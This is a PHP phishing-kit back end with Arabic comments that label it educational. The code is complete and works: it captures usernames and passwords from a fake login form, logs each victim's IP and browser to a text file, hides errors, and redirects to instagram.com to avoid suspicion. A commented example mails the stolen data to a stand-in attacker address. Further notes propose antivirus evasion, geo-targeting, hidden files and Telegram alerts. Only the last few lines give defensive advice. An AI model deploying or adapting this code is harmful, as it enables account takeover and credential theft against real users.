<?php
/*
========================================
سكريبت PHP تعليمي لحفظ بيانات التصيد الاحتيالي
الغرض: تعليمي بحت لفهم كيفية عمل خوادم التصيد
========================================

هذا الملف يوضح:
1. كيف يتم استقبال البيانات من النموذج
2. كيف يتم حفظ البيانات المسروقة
3. كيف يتم إخفاء الأثر عن المستخدم
4. كيف يتم إعادة التوجيه لتجنب الشك

تحذير: هذا المشروع للتعليم فقط!
*/

// ========================================
// 1. إعدادات الأمان والخصوصية
// ========================================

// بدء جلسة PHP (للتعامل مع البيانات المؤقتة)
session_start();

// تعطيل عرض الأخطاء لإخفاء أي مشاكل تقنية عن المستخدم الضحية
error_reporting(0);
ini_set('display_errors', 0);

// تحديد المنطقة الزمنية (مهم لتسجيل الأوقات بدقة)
date_default_timezone_set('Asia/Riyadh');

// ========================================
// 2. إعدادات ملف حفظ البيانات المسروقة
// ========================================

// اسم الملف الذي سيحفظ البيانات المسروقة
$stolen_data_file = 'stolen_credentials.txt';

// اسم ملف سجل الدخول (لحفظ معلومات إضافية)
$log_file = 'access_log.txt';

// ========================================
// 3. فحص طريقة الإرسال ووجود البيانات
// ========================================

// التأكد من أن البيانات تم إرسالها عبر POST
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    
    // ========================================
    // 4. جمع البيانات من النموذج
    // ========================================
    
    // الحصول على اسم المستخدم (مع تنظيف البيانات)
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    
    // الحصول على كلمة المرور (مع تنظيف البيانات) 
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    
    // ========================================
    // 5. جمع معلومات إضافية عن الضحية
    // ========================================
    
    // عنوان IP الخاص بالضحية
    $user_ip = $_SERVER['REMOTE_ADDR'];
    
    // معلومات المتصفح والنظام
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    // الصفحة التي جاء منها المستخدم (إن وجدت)
    $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'مجهول';
    
    // الوقت والتاريخ الحالي
    $timestamp = date('Y-m-d H:i:s');
    
    // ========================================
    // 6. التحقق من صحة البيانات المدخلة
    // ========================================
    
    // فحص أن البيانات غير فارغة
    if (!empty($username) && !empty($password)) {
        
        // ========================================
        // 7. تحضير البيانات للحفظ
        // ========================================
        
        // تنسيق البيانات المسروقة
        $stolen_data = array(
            'timestamp' => $timestamp,
            'username' => $username,
            'password' => $password,
            'ip_address' => $user_ip,
            'user_agent' => $user_agent,
            'referer' => $referer
        );
        
        // تحويل البيانات إلى نص منسق
        $data_string = "=== تم التقاط بيانات جديدة ===\n";
        $data_string .= "التاريخ والوقت: " . $timestamp . "\n";
        $data_string .= "اسم المستخدم: " . $username . "\n";
        $data_string .= "كلمة المرور: " . $password . "\n";
        $data_string .= "عنوان IP: " . $user_ip . "\n";
        $data_string .= "معلومات المتصفح: " . $user_agent . "\n";
        $data_string .= "المصدر: " . $referer . "\n";
        $data_string .= "=====================================\n\n";
        
        // ========================================
        // 8. حفظ البيانات في الملف
        // ========================================
        
        // محاولة حفظ البيانات (مع معالجة الأخطاء)
        if (file_put_contents($stolen_data_file, $data_string, FILE_APPEND | LOCK_EX)) {
            
            // تسجيل عملية حفظ ناجحة في ملف السجل
            $log_entry = "[" . $timestamp . "] تم حفظ بيانات المستخدم: " . $username . " من IP: " . $user_ip . "\n";
            file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
            
            // متغير لتأكيد نجاح العملية
            $save_success = true;
            
        } else {
            
            // تسجيل فشل في الحفظ
            $log_entry = "[" . $timestamp . "] فشل في حفظ بيانات المستخدم: " . $username . "\n";
            file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
            
            $save_success = false;
        }
        
        // ========================================
        // 9. إرسال البيانات عبر البريد الإلكتروني (اختياري)
        // ========================================
        
        /*
        في التطبيق الحقيقي، يمكن للمهاجم إرسال البيانات فوراً عبر:
        1. البريد الإلكتروني
        2. خدمات Webhook
        3. قواعد بيانات خارجية
        4. تطبيقات Telegram Bot
        
        مثال على الإرسال عبر البريد:
        
        $to = "attacker@example.com";
        $subject = "New Phishing Data Captured";
        $message = $data_string;
        $headers = "From: phishing@example.com";
        
        mail($to, $subject, $message, $headers);
        */
        
        // ========================================
        // 10. إعداد إعادة التوجيه
        // ========================================
        
        /*
        هنا يتم تحديد إلى أين سيتم توجيه المستخدم بعد "تسجيل الدخول"
        الخيارات الشائعة:
        1. الموقع الأصلي (instagram.com)
        2. صفحة خطأ مزيفة
        3. صفحة تحميل مؤقتة
        4. نفس الصفحة مع رسالة خطأ
        */
        
        // إعدادات إعادة التوجيه
        $redirect_options = array(
            'original_site' => 'https://www.instagram.com/',
            'fake_error' => 'error_page.html',
            'loading_page' => 'loading.html',
            'same_page_error' => 'index.html?error=1'
        );
        
        // اختيار نوع إعادة التوجيه (يمكن تغييرها حسب الاستراتيجية)
        $redirect_type = 'original_site'; // يمكن تغييرها إلى أي خيار آخر
        
        // ========================================
        // 11. تنفيذ إعادة التوجيه
        // ========================================
        
        switch ($redirect_type) {
            
            case 'original_site':
                // التوجيه للموقع الأصلي (الأسلوب الأكثر شيوعاً)
                header('Location: ' . $redirect_options['original_site']);
                break;
                
            case 'fake_error':
                // التوجيه لصفحة خطأ مزيفة
                header('Location: ' . $redirect_options['fake_error']);
                break;
                
            case 'loading_page':
                // التوجيه لصفحة تحميل مؤقتة
                header('Location: ' . $redirect_options['loading_page']);
                break;
                
            case 'same_page_error':
                // العودة لنفس الصفحة مع رسالة خطأ
                header('Location: ' . $redirect_options['same_page_error']);
                break;
                
            default:
                // التوجيه الافتراضي للموقع الأصلي
                header('Location: ' . $redirect_options['original_site']);
        }
        
        // إنهاء تنفيذ السكريبت بعد إعادة التوجيه
        exit();
        
    } else {
        
        // ========================================
        // 12. معالجة البيانات الناقصة أو الخاطئة
        // ========================================
        
        // تسجيل محاولة دخول بيانات ناقصة
        $log_entry = "[" . $timestamp . "] محاولة دخول ببيانات ناقصة من IP: " . $user_ip . "\n";
        file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
        
        // إعادة التوجيه لنفس الصفحة مع رسالة خطأ
        header('Location: index.html?error=empty_fields');
        exit();
    }
    
} else {
    
    // ========================================
    // 13. معالجة الوصول المباشر للملف
    // ========================================
    
    // في حالة محاولة الوصول المباشر للملف (بدون POST)
    // يتم توجيه المستخدم للصفحة الرئيسية
    
    $timestamp = date('Y-m-d H:i:s');
    $user_ip = $_SERVER['REMOTE_ADDR'];
    
    // تسجيل محاولة الوصول المباشر
    $log_entry = "[" . $timestamp . "] محاولة وصول مباشر لملف PHP من IP: " . $user_ip . "\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
    
    // إعادة التوجيه للصفحة الرئيسية
    header('Location: index.html');
    exit();
}

// ========================================
// 14. أكواد إضافية متقدمة (للمتقدمين)
// ========================================

/*
تقنيات متقدمة يمكن إضافتها:

1. تشفير البيانات المحفوظة:
   - استخدام base64_encode() أو openssl_encrypt()
   - حفظ البيانات في قاعدة بيانات مشفرة

2. كشف برامج مكافحة الفيروسات:
   - فحص User-Agent للكشف عن البرامج المشبوهة
   - تجنب الحفظ إذا تم كشف برنامج أمان

3. التحقق الجغرافي:
   - استخدام خدمات GeoIP للتحقق من موقع الضحية
   - تفعيل الهجوم فقط في مناطق معينة

4. تحليل سلوك المستخدم:
   - قياس الوقت المستغرق في ملء النموذج
   - كشف البوت والبرامج الآلية

5. إخفاء متقدم:
   - استخدام ملفات .htaccess لإخفاء الملفات
   - تغيير أسماء الملفات دورياً

6. إشعارات فورية:
   - ربط مع Telegram Bot
   - إرسال تنبيهات SMS

7. لوحة تحكم:
   - إنشاء واجهة إدارة لعرض البيانات المحفوظة
   - إحصائيات ومؤشرات الأداء

مثال على تشفير البيانات:
$encrypted_data = base64_encode($data_string);
file_put_contents($stolen_data_file, $encrypted_data, FILE_APPEND);

مثال على كشف البوت:
if (strpos(strtolower($user_agent), 'bot') !== false) {
    // تجاهل البوت
    exit();
}
*/

// ========================================
// نهاية السكريبت
// ========================================

/*
ملخص ما يحدث في هذا السكريبت:

1. يستقبل البيانات من نموذج تسجيل الدخول المزيف
2. يجمع معلومات إضافية عن الضحية (IP، متصفح، وقت)
3. يحفظ جميع البيانات في ملف نصي على الخادم
4. يسجل العمليات في ملف سجل منفصل
5. يوجه المستخدم للموقع الأصلي لتجنب الشك
6. يتعامل مع الأخطاء والحالات الاستثنائية

أهمية هذا السكريبت في التصيد:
- هو القلب النابض لعملية التصيد
- يحدد نجاح أو فشل الهجوم
- يجب أن يعمل بسرعة وصمت
- لا يجب أن يثير شكوك المستخدم

للحماية من هذا النوع من الهجمات:
1. التحقق دائماً من صحة رابط الموقع
2. عدم الوثوق بالروابط في الرسائل
3. استخدام المصادقة الثنائية
4. فحص شهادة SSL للموقع
5. استخدام مدير كلمات مرور موثوق
*/
?>
